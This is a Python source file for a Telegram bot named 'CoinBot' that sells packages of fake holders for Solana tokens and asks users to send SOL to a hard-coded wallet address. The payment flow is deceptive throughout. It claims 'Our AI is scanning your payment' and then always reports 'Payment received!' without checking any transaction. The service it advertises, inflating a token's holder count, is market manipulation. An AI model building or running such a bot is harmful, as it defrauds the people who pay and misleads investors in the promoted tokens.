import logging
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, CallbackQueryHandler, CallbackContext

# Enable logging to see errors and bot activity
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Conversation States ---
ASK_CONTRACT, ASK_TOKEN_NAME, SHOW_OPTIONS, AWAIT_SCREENSHOT = range(4)

# --- Bot Configuration ---
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("No TELEGRAM_BOT_TOKEN found in environment variables. Please set it.")

DEPOSIT_ADDRESS = '5H5xeKUt1wh5SE8hSJbnh9tsdVgZrUrbGffQjD9HTE9E'

# --- Job Queue Callbacks ---
# These functions are designed to be called by the job queue after a delay.

async def send_scanning_message(context: CallbackContext):
    """
    Sends the 'AI is scanning' message and schedules the final confirmation.
    """
    job = context.job
    # Send the scanning message
    await context.bot.send_message(chat_id=job.chat_id, text="⏳ Our AI is scanning your payment...")
    # Schedule the next message to be sent in 4 seconds
    context.job_queue.run_once(send_final_confirmation, 4, chat_id=job.chat_id, name=f"final_{job.chat_id}")

async def send_final_confirmation(context: CallbackContext):
    """
    Sends the final 'Payment received' message.
    """
    job = context.job
    # Send the final confirmation message
    await context.bot.send_message(
        chat_id=job.chat_id,
        text="🎉 Payment received!\n\n"
             "Your holder increase is now being processed. We will notify you upon completion.\n\n"
             "You can start a new request by sending /start."
    )

# --- Main Bot Functions ---

async def start(update: Update, context: CallbackContext) -> int:
    """
    Starts the conversation when the user sends /start.
    """
    user = update.effective_user
    welcome_message = (
        f"👋 Welcome to CoinBot, {user.first_name}!\n\n"
        "I can help you get more holders for your Solana token.\n\n"
        "First, please send me your token's contract address."
    )
    await update.message.reply_text(welcome_message)
    return ASK_CONTRACT

async def ask_for_contract(update: Update, context: CallbackContext) -> int:
    """
    Stores the contract address and asks for the token name.
    """
    context.user_data['contract_address'] = update.message.text
    logger.info(f"Contract Address from {update.effective_user.first_name}: {context.user_data['contract_address']}")
    await update.message.reply_text("Great! Now, please tell me the name of your token (e.g., 'MyCoolToken').")
    return ASK_TOKEN_NAME

async def ask_for_token_name(update: Update, context: CallbackContext) -> int:
    """
    Stores the token name and then shows the main service options.
    """
    context.user_data['token_name'] = update.message.text
    logger.info(f"Token Name from {update.effective_user.first_name}: {context.user_data['token_name']}")
    await update.message.reply_text(f"Perfect! You've set the token: {context.user_data['token_name']}.")
    return await show_payment_options(update, context)

async def show_payment_options(update: Update, context: CallbackContext) -> int:
    """
    Displays the main menu with the different holder packages.
    """
    keyboard = [
        [InlineKeyboardButton("📦 50 Holders (0.5 SOL)", callback_data='option_1')],
        [InlineKeyboardButton("🚀 400 Holders (1.8 SOL)", callback_data='option_2')],
        [InlineKeyboardButton("🌟 700 Holders (3.0 SOL)", callback_data='option_3')],
        [InlineKeyboardButton("🔥 1000 Holders (3.8 SOL)", callback_data='option_4')],
        [InlineKeyboardButton("💎 DexScreener/Pump.fun Feature (6.0 SOL)", callback_data='option_5')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.message.edit_text(
            "Please choose a package to increase your token holders:",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "Please choose a package to increase your token holders:",
            reply_markup=reply_markup
        )
    return SHOW_OPTIONS

async def handle_payment_choice(update: Update, context: CallbackContext) -> int:
    """
    Handles the user's choice from the payment options menu.
    """
    query = update.callback_query
    await query.answer()
    context.user_data['chosen_option'] = query.data
    options_details = {
        'option_1': "📦 50 Holders for 0.5 SOL",
        'option_2': "🚀 400 Holders for 1.8 SOL",
        'option_3': "🌟 700 Holders for 3.0 SOL",
        'option_4': "🔥 1000 Holders for 3.8 SOL",
        'option_5': "💎 DexScreener/Pump.fun Feature for 6.0 SOL"
    }
    chosen_plan_text = options_details.get(query.data, "the selected plan")
    deposit_message = (
        f"You have selected: **{chosen_plan_text}**.\n\n"
        "To proceed, please deposit the required SOL amount to the following address:\n\n"
        f"`{DEPOSIT_ADDRESS}`\n\n"
        "(Tap to copy the address)\n\n"
        "After making the deposit, please take a screenshot of the transaction confirmation."
    )
    keyboard = [[InlineKeyboardButton("✅ Confirm Payment", callback_data='confirm_payment')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=deposit_message, reply_markup=reply_markup, parse_mode='Markdown')
    return AWAIT_SCREENSHOT

async def prompt_for_screenshot(update: Update, context: CallbackContext) -> int:
    """
    Asks the user to upload the screenshot.
    """
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text="To fast-track your deposit, please submit a screenshot of your transaction now.\n\n"
             "Our AI will scan it to activate your bot."
    )
    return AWAIT_SCREENSHOT

async def handle_screenshot(update: Update, context: CallbackContext) -> int:
    """
    Handles the uploaded screenshot and schedules the follow-up messages.
    """
    photo = update.message.photo[-1]
    chat_id = update.effective_chat.id
    logger.info(f"Screenshot received from {update.effective_user.first_name}. File ID: {photo.file_id}")

    # 1. Send initial confirmation message
    await update.message.reply_text(
        "✅ Thank you! We have received your screenshot.\n\n"
        "Your payment is being verified. This usually takes just a few moments."
    )

    # 2. Schedule the next message using the job queue for reliability
    context.job_queue.run_once(send_scanning_message, 10, chat_id=chat_id, name=f"scan_{chat_id}")

    # End the conversation flow. The jobs will run in the background.
    return ConversationHandler.END

async def cancel(update: Update, context: CallbackContext) -> int:
    """
    Cancels and ends the conversation.
    """
    user = update.effective_user
    logger.info(f"User {user.first_name} canceled the conversation.")
    await update.message.reply_text(
        'Action canceled. Send /start anytime to begin again.'
    )
    return ConversationHandler.END

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_CONTRACT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_for_contract)],
            ASK_TOKEN_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_for_token_name)],
            SHOW_OPTIONS: [CallbackQueryHandler(handle_payment_choice)],
            AWAIT_SCREENSHOT: [
                CallbackQueryHandler(prompt_for_screenshot, pattern='^confirm_payment$'),
                MessageHandler(filters.PHOTO, handle_screenshot)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    application.add_handler(conv_handler)
    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
